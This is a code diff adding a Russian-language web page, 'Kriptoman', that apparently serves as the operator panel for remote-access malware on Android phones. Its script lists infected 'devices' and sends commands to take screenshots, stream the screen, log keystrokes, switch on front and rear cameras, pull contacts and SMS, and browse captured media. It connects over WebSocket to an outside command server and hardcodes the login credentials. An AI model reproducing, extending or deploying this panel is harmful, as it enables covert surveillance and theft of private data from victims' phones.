@@ -1,41 +1,388 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kriptoman</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kriptoman</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',Arial,sans-serif; background:#0a0a0a; color:#eee; transition:background 0.3s,color 0.3s; }
+body.dark { background:#1a1a1a; color:#eee; }
+body.dark .navbar { background:#2a2a2a; }
+body.dark .card { background:#2a2a2a; border-color:#444; }
+body.dark .login-box { background:#2a2a2a; }
+body.dark input, body.dark button { background:#333; color:#eee; border-color:#555; }
+body.light { background:#f0f0f0; color:#222; }
+body.light .navbar { background:#ccc; }
+body.light .card { background:#fff; border-color:#ddd; }
+body.light .login-box { background:#fff; }
+body.light input, body.light button { background:#f4f4f4; color:#222; border-color:#ccc; }
+.navbar { display:flex; justify-content:space-between; align-items:center; background:#2a2a2a; color:#fff; padding:10px 20px; flex-wrap:wrap; }
+.nav-brand { font-size:1.5rem; font-weight:bold; }
+.burger { display:none; background:none; border:none; color:#fff; font-size:1.8rem; cursor:pointer; }
+.nav-menu { display:flex; list-style:none; flex-wrap:wrap; }
+.nav-menu li { margin:0 10px; }
+.nav-menu a { color:#fff; text-decoration:none; font-size:1rem; cursor:pointer; }
+.nav-menu a:hover { text-decoration:underline; }
+.container { padding:20px; max-width:1200px; margin:0 auto; }
+.card { background:#2a2a2a; border-radius:8px; padding:20px; margin:10px 0; border:1px solid #444; }
+.card-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(200px,1fr)); gap:15px; }
+.device-item { cursor:pointer; padding:15px; border:1px solid #555; border-radius:8px; text-align:center; transition:0.2s; background:#1a1a1a; }
+.device-item:hover { transform:scale(1.02); background:#333; }
+.status.online { color:#4caf50; }
+.status.offline { color:#f44336; }
+.control-panel { display:grid; grid-template-columns:repeat(auto-fill, minmax(130px,1fr)); gap:10px; margin:15px 0; }
+.control-panel button { padding:10px; background:#555; color:#fff; border:none; border-radius:6px; box-shadow:0 4px 8px rgba(0,0,0,0.6); cursor:pointer; transition:0.2s; }
+.control-panel button:hover { background:#777; }
+.login-container { display:flex; justify-content:center; align-items:center; height:100vh; }
+.login-box { background:#2a2a2a; padding:40px; border-radius:12px; box-shadow:0 0 30px rgba(255,0,0,0.3); min-width:300px; text-align:center; }
+.login-box input { width:100%; padding:12px; margin:10px 0; border:1px solid #555; border-radius:6px; background:#1a1a1a; color:#eee; }
+.login-box button { width:100%; padding:12px; background:#555; color:#fff; border:none; border-radius:6px; box-shadow:0 4px 8px rgba(0,0,0,0.5); cursor:pointer; font-size:16px; }
+.error { color:#f44336; margin-top:10px; }
+.history-list { max-height:400px; overflow-y:auto; }
+.history-item { padding:8px; border-bottom:1px solid #444; }
+.detail-info { margin:10px 0; }
+.detail-info span { font-weight:bold; }
+@media (max-width:768px) {
+    .burger { display:block; }
+    .nav-menu { display:none; flex-direction:column; width:100%; }
+    .nav-menu.active { display:flex; }
+    .nav-menu li { margin:5px 0; }
+}
+.stream-container { display:none; margin-top:20px; border:1px solid #555; padding:10px; border-radius:8px; background:#111; }
+.stream-container img { width:100%; max-width:600px; border:1px solid #000; background:#000; }
+.stream-container button { margin-top:10px; background:#d32f2f; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; }
+</style>
 </head>
 <body>
-    <div id="login" class="login-container">
-        <div class="login-box">
-            <h2>Вход</h2>
-            <input type="password" id="password" placeholder="Пароль">
-            <input type="password" id="secret" placeholder="Секретная фраза">
-            <button id="loginBtn">Войти</button>
-            <div id="loginError" class="error"></div>
-        </div>
-    </div>
-    <div id="app" style="display:none;">
-        <nav class="navbar">
-            <div class="nav-brand">Kriptoman</div>
-            <button class="burger" id="burgerBtn">☰</button>
-            <ul class="nav-menu" id="navMenu">
-                <li><a href="#" data-page="devices">Устройства</a></li>
-                <li><a href="#" data-page="settings">Настройки</a></li>
-                <li><a href="#" data-page="history">История</a></li>
-                <li><a href="#" data-page="create">Создать</a></li>
-                <li><a href="#" data-page="media">Файлы</a></li>
-                <li><a href="/screenshots.html" target="_blank">Галерея</a></li>
-                <li><a href="#" id="logoutBtn">Выход</a></li>
-            </ul>
-        </nav>
-        <div class="container" id="content"></div>
-    </div>
-    <script src="/main.js"></script>
-    <script src="/devices.js"></script>
-    <script src="/control.js"></script>
-    <script src="/screenshots.js"></script>
-    <script src="/settings.js"></script>
+<div id="login" class="login-container">
+<div class="login-box">
+<h2>Вход в Kriptoman</h2>
+<input type="password" id="password" placeholder="Пароль">
+<input type="password" id="secret" placeholder="Секретная фраза">
+<button id="loginBtn">Войти</button>
+<div id="loginError" class="error"></div>
+</div>
+</div>
+<div id="app" style="display:none;">
+<nav class="navbar">
+<div class="nav-brand">Kriptoman</div>
+<button class="burger" id="burgerBtn">☰</button>
+<ul class="nav-menu" id="navMenu">
+<li><a href="#" data-page="devices">Устройства</a></li>
+<li><a href="#" data-page="settings">Настройки</a></li>
+<li><a href="#" data-page="history">История</a></li>
+<li><a href="#" data-page="create">Создать</a></li>
+<li><a href="#" data-page="media">Файлы</a></li>
+<li><a href="#" id="logoutBtn">Выход</a></li>
+</ul>
+</nav>
+<div class="container" id="content"></div>
+</div>
+<script>
+(function() {
+    let ws = null;
+    let devicesData = {};
+    let currentCode = null;
+    let streamListener = null;
+
+    const loginDiv = document.getElementById('login');
+    const appDiv = document.getElementById('app');
+    const password = document.getElementById('password');
+    const secret = document.getElementById('secret');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginError = document.getElementById('loginError');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const burgerBtn = document.getElementById('burgerBtn');
+    const navMenu = document.getElementById('navMenu');
+    const content = document.getElementById('content');
+
+    function showPage(page) {
+        if (page === 'devices') renderDevices();
+        else if (page === 'settings') renderSettings();
+        else if (page === 'history') renderHistory();
+        else if (page === 'create') renderCreate();
+        else if (page === 'media') renderMedia();
+        else content.innerHTML = '<div class="card"><h2>Главное меню</h2><p>Выберите устройство для управления</p></div>';
+        navMenu.classList.remove('active');
+    }
+
+    function loadDevices() {
+        fetch('/api/devices')
+            .then(r => r.json())
+            .then(data => {
+                devicesData = {};
+                data.forEach(d => devicesData[d.code] = d);
+                if (document.querySelector('.device-grid')) renderDevices();
+            })
+            .catch(err => console.error);
+    }
+
+    function renderDevices() {
+        const list = Object.values(devicesData);
+        let html = '<div class="card"><h2>Устройства</h2><div class="card-grid">';
+        if (list.length === 0) {
+            html += '<p>Нет устройств</p>';
+        } else {
+            list.forEach(d => {
+                const statusClass = d.status === 'online' ? 'online' : 'offline';
+                html += `<div class="device-item" data-code="${d.code}">
+                    <strong>${d.name}</strong><br>
+                    Код: ${d.code}<br>
+                    <span class="status ${statusClass}">${d.status}</span><br>
+                    IP: ${d.ip}<br>
+                    VPN: ${d.vpn ? 'Да' : 'Нет'}
+                </div>`;
+            });
+        }
+        html += '</div></div>';
+        content.innerHTML = html;
+        document.querySelectorAll('.device-item').forEach(el => {
+            el.addEventListener('click', function() {
+                currentCode = this.dataset.code;
+                renderControlPanel(currentCode);
+            });
+        });
+    }
+
+    function renderControlPanel(code) {
+        const d = devicesData[code];
+        if (!d) return;
+        let html = `<div class="card"><h2>Управление: ${d.name}</h2>
+            <div class="detail-info">Код: ${d.code} | IP: ${d.ip} | VPN: ${d.vpn ? 'Да' : 'Нет'} | Статус: ${d.status}</div>
+            <div class="control-panel">
+                <button data-cmd="screenshot">Скриншот</button>
+                <button data-cmd="video">Видео</button>
+                <button data-cmd="stream">Трансляция</button>
+                <button data-cmd="keyboard">Клавиатура</button>
+                <button data-cmd="app">Открыть приложение</button>
+                <button data-cmd="frontcam">Фронт. камера</button>
+                <button data-cmd="backcam">Осн. камера</button>
+                <button data-cmd="contacts">Контакты</button>
+                <button data-cmd="sms">SMS</button>
+            </div>
+            <button id="backDevices">Назад</button>
+            <div id="streamContainer" class="stream-container">
+                <h3>Трансляция</h3>
+                <img id="streamImage" src="">
+                <button id="stopStreamBtn">Остановить</button>
+            </div>
+        </div>`;
+        content.innerHTML = html;
+        document.querySelectorAll('.control-panel button').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const cmd = this.dataset.cmd;
+                if (cmd === 'stream') {
+                    document.getElementById('streamContainer').style.display = 'block';
+                    sendCommand(code, cmd, { action: 'start' });
+                    if (ws) {
+                        if (streamListener) ws.removeEventListener('message', streamListener);
+                        streamListener = function(e) {
+                            try {
+                                const data = JSON.parse(e.data);
+                                if (data.type === 'stream_frame' && data.code === code) {
+                                    document.getElementById('streamImage').src = 'data:image/png;base64,' + data.image;
+                                }
+                            } catch(e) {}
+                        };
+                        ws.addEventListener('message', streamListener);
+                    }
+                    document.getElementById('stopStreamBtn').onclick = function() {
+                        sendCommand(code, 'stream', { action: 'stop' });
+                        document.getElementById('streamContainer').style.display = 'none';
+                        document.getElementById('streamImage').src = '';
+                        if (streamListener) {
+                            ws.removeEventListener('message', streamListener);
+                            streamListener = null;
+                        }
+                    };
+                } else if (cmd === 'app') {
+                    const pkg = prompt('Введите имя пакета (например, com.android.chrome)');
+                    if (pkg) sendCommand(code, cmd, { package: pkg });
+                } else {
+                    sendCommand(code, cmd);
+                }
+            });
+        });
+        document.getElementById('backDevices').onclick = function() {
+            showPage('devices');
+        };
+    }
+
+    function sendCommand(code, command, params) {
+        fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code, command, params: params || {} })
+        }).then(r => r.json()).then(data => {
+            if (data.error) console.error(data.error);
+            else console.log('Команда отправлена:', command);
+        }).catch(err => console.error);
+    }
+
+    function renderSettings() {
+        let html = `<div class="card"><h2>Настройки</h2>
+            <button id="deleteAll" style="background:#d32f2f; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">Удалить все устройства</button>
+            <br><br>
+            <button id="toggleTheme" style="background:#777; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">Сменить тему</button>
+        </div>`;
+        content.innerHTML = html;
+        document.getElementById('deleteAll').onclick = function() {
+            if (confirm('Удалить все устройства?')) {
+                fetch('/api/devices', { method: 'DELETE' }).then(() => loadDevices());
+            }
+        };
+        document.getElementById('toggleTheme').onclick = function() {
+            document.body.classList.toggle('light');
+            document.body.classList.toggle('dark');
+        };
+    }
+
+    function renderHistory() {
+        let html = `<div class="card"><h2>История</h2>
+            <div>
+                <label>Устройство: </label>
+                <select id="historyDeviceSelect"><option value="">--</option></select>
+                <button id="loadHistoryBtn">Загрузить</button>
+                <button id="clearHistoryBtn" style="margin-left:10px;">Очистить</button>
+            </div>
+            <div id="historyContent" class="history-list"></div>
+        </div>`;
+        content.innerHTML = html;
+        const select = document.getElementById('historyDeviceSelect');
+        Object.values(devicesData).forEach(d => {
+            const opt = document.createElement('option');
+            opt.value = d.code;
+            opt.textContent = `${d.name} (${d.code})`;
+            select.appendChild(opt);
+        });
+        document.getElementById('loadHistoryBtn').onclick = function() {
+            const code = select.value;
+            if (!code) { alert('Выберите устройство'); return; }
+            fetch('/api/history/' + code).then(r => r.json()).then(data => {
+                const container = document.getElementById('historyContent');
+                if (data.length === 0) { container.innerHTML = '<p>Нет команд</p>'; return; }
+                let html = '';
+                data.forEach(item => {
+                    const time = new Date(item.time).toLocaleString();
+                    html += `<div class="history-item">${time} - ${item.command} - ${item.result || ''}</div>`;
+                });
+                container.innerHTML = html;
+            });
+        };
+        document.getElementById('clearHistoryBtn').onclick = function() {
+            const code = select.value;
+            if (!code) { alert('Выберите устройство'); return; }
+            if (confirm('Очистить историю?')) {
+                fetch('/api/history/' + code, { method: 'DELETE' }).then(() => {
+                    document.getElementById('historyContent').innerHTML = '<p>История очищена</p>';
+                });
+            }
+        };
+    }
+
+    function renderCreate() {
+        let html = `<div class="card"><h2>Создать устройство</h2>
+            <input type="text" id="newDeviceName" placeholder="Имя устройства" style="width:100%; padding:10px; margin:10px 0;">
+            <button id="createDeviceBtn" style="background:#4caf50; color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">Добавить</button>
+            <div id="createResult"></div>
+        </div>`;
+        content.innerHTML = html;
+        document.getElementById('createDeviceBtn').onclick = function() {
+            const name = document.getElementById('newDeviceName').value.trim();
+            if (!name) { alert('Введите имя'); return; }
+            fetch('/api/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name })
+            }).then(r => r.json()).then(data => {
+                if (data.error) alert('Ошибка: ' + data.error);
+                else { alert('Устройство добавлено. Код: ' + data.code); loadDevices(); }
+            });
+        };
+    }
+
+    function renderMedia() {
+        fetch('/api/media')
+            .then(r => r.json())
+            .then(files => {
+                let html = '<div class="card"><h2>Файлы</h2>';
+                if (files.length === 0) { html += '<p>Нет файлов</p>'; }
+                else {
+                    html += '<div style="display:flex; flex-wrap:wrap; gap:15px;">';
+                    files.forEach(f => {
+                        const isImage = f.filename.match(/\.(png|jpg|jpeg)$/i);
+                        const isVideo = f.filename.match(/\.(mp4|webm|avi)$/i);
+                        const date = new Date(f.timestamp).toLocaleString();
+                        html += `<div style="border:1px solid #555; padding:10px; border-radius:8px; max-width:200px; text-align:center; background:#1a1a1a;">
+                            ${isImage ? `<img src="${f.url}" style="max-width:100%; max-height:150px; border-radius:4px;">` : ''}
+                            ${isVideo ? `<video src="${f.url}" controls style="max-width:100%; max-height:150px;"></video>` : ''}
+                            ${!isImage && !isVideo ? `<div style="font-size:40px;">📄</div>` : ''}
+                            <div style="font-size:12px; margin-top:5px;"><a href="${f.url}" target="_blank">${f.filename}</a></div>
+                            <div style="font-size:10px; color:#999;">${date}</div>
+                        </div>`;
+                    });
+                    html += '</div>';
+                }
+                html += '</div>';
+                content.innerHTML = html;
+            })
+            .catch(() => { content.innerHTML = '<div class="card"><h2>Ошибка загрузки файлов</h2></div>'; });
+    }
+
+    loginBtn.onclick = function() {
+        if (password.value === 'rootsql123' && secret.value === 'root') {
+            loginDiv.style.display = 'none';
+            appDiv.style.display = 'block';
+            connectWebSocket();
+            loadDevices();
+            showPage('devices');
+        } else {
+            loginError.textContent = 'Неверные данные';
+        }
+    };
+
+    logoutBtn.onclick = function() {
+        if (ws) ws.close();
+        loginDiv.style.display = 'flex';
+        appDiv.style.display = 'none';
+    };
+
+    burgerBtn.onclick = function() {
+        navMenu.classList.toggle('active');
+    };
+
+    document.addEventListener('click', function(e) {
+        if (e.target.matches('.nav-menu a[data-page]')) {
+            e.preventDefault();
+            const page = e.target.dataset.page;
+            if (page === 'devices') loadDevices();
+            showPage(page);
+        }
+    });
+
+    function connectWebSocket() {
+        const url = 'wss://pycj.onrender.com';
+        ws = new WebSocket(url);
+        ws.onopen = function() {
+            ws.send(JSON.stringify({ type: 'auth', password: 'rootsql123', secret: 'root' }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                const data = JSON.parse(event.data);
+                if (data.type === 'auth_success') console.log('WebSocket авторизован');
+                if (data.type === 'devices') {
+                    devicesData = {};
+                    data.devices.forEach(d => devicesData[d.code] = d);
+                    if (document.querySelector('.device-grid')) renderDevices();
+                }
+            } catch(e) {}
+        };
+        ws.onclose = function() {
+            setTimeout(connectWebSocket, 3000);
+        };
+    }
+})();
+</script>
 </body>
 </html>
